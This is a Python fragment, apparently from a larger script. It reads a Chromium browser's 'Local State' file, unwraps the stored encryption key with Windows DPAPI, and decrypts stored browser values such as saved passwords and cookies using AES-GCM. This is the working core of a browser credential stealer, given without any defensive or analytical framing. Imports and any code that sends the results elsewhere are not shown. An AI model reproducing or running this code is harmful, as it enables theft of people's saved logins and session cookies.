def decrypt_chromium_value(encrypted_value, key):
    if not key or len(encrypted_value) < 15:
        return None
    try:
        from Crypto.Cipher import AES
        for offset in [1, 3]:
            if len(encrypted_value) < offset + 12 + 16:
                continue
            nonce = encrypted_value[offset:offset+12]
            ciphertext = encrypted_value[offset+12:-16]
            tag = encrypted_value[-16:]
            try:
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8', errors='ignore')
            except:
                continue
        return CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except Exception:
        return None

def get_browser_key(browser_path):
    local_state = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state):
        return None
    try:
        with open(local_state, 'r', encoding='utf-8') as f:
            ls = json.load(f)
        enc_key = base64.b64decode(ls['os_crypt']['encrypted_key'])[5:]
        key = CryptUnprotectData(enc_key, None, None, None, 0)[1]
        return key
    except Exception:
        return None

